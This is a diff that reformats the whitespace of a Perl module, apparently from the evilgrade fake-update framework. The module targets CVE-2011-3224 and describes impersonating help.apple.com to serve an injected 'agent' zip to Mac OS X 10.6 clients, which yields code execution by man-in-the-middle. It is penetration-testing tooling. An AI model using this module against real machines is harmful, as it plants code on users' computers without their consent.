@@ -27,46 +27,48 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'appstore',
+my $base = {
+    'name'    => 'appstore',
     'version' => '1.0',
     'appver'  => '< Mac OS X v10.6.*',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com >' ],
-    'description' => qq{CVE: CVE-2011-3224 Found By: Aaron Sigel and Brian Mastenbrook 
-			The agent have a modification in Resources/scripts/updatefrontend.py to open a Chess application
-			look for the comment evilgrade.
-			The code is execute the next time the user open the help book, more information:
-			http://vttynotes.blogspot.com/2011/10/cve-2011-3224-mitm-to-rce-with-mac-app.html},    
-    'vh' => '(help.apple.com)',
+    'author'  => ['Francisco Amato < famato +[AT]+ infobytesec.com >'],
+    'description' =>
+        qq{CVE: CVE-2011-3224 Found By: Aaron Sigel and Brian Mastenbrook
+            The agent have a modification in Resources/scripts/updatefrontend.py to open a Chess application
+            look for the comment evilgrade.
+            The code is execute the next time the user open the help book, more information:
+            http://vttynotes.blogspot.com/2011/10/cve-2011-3224-mitm-to-rce-with-mac-app.html},
+    'vh'      => '(help.apple.com)',
     'request' => [
-		    {
-		    'req' => 'helpbook-version.txt', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '324071169.795686',
-		    'parse' => 0,
-		    'file' => '',
-		    },
+        {   'req'    => 'helpbook-version.txt',    #regex friendly
+            'type'   => 'string',                  #file|string|agent|install
+            'method' => '',                        #any
+            'bin'    => 0,
+            'string' => '324071169.795686',
+            'parse'  => 0,
+            'file'   => '',
+        },
 
-		    {
-		    'req' => '.zip', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin' =>1,
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+        {   'req'    => '.zip',                    #regex friendly
+            'type'   => 'agent',                   #file|string|agent|install
+            'method' => '',                        #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/helpbook.zip', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/helpbook.zip', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+    }
 };
 
 ##########################################################################
@@ -79,5 +81,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
